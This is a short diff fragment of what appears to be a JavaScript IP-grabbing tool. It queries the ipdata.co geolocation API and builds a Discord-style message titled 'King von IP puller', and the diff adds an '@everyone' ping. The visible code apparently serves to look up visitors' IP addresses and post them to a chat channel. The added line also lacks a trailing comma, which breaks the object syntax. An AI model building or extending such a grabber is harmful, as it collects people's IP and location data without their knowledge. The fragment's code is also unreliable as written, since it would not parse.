@@ -17,6 +17,7 @@
 
         json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
             let message = {
+                content: "@everyone"
                 embeds: [
                     {
                         title: "King von IP puller 😈",
